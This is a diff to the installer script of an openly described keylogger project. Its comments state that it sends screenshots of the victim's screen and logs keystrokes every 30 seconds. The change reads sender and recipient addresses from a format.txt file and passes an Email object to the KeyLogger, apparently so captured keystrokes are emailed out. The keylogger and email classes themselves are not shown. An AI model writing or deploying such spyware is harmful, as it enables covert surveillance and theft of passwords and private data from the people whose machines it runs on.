@@ -12,15 +12,27 @@
 # - sends screenshot of the persons screen every 30 seconds
 # - key strokes are logged to a file. File is sent every 30 seconds?
 
-from logger import KeyLogger # import class we created
 
+# format.txt -
+# first line: <sender-emial>
+# second line: <recepient-email>
+
+from keylogger import KeyLogger # import class we created
+from myemail import Email
 
 def main():
     """
     Main "installation" function used to install program
     """
-    kl = KeyLogger() # create the keylogger object
-    kl.run_keylogger() # run the key logging process
+    f = open("format.txt")
+
+    # create the email from formatter
+    email = Email(f.readline(), f.readline())
+    kl = KeyLogger(email) 
+    kl.run_keylogger()
+
+    # close file
+    f.close()
 
 
 # check to see if main script being run
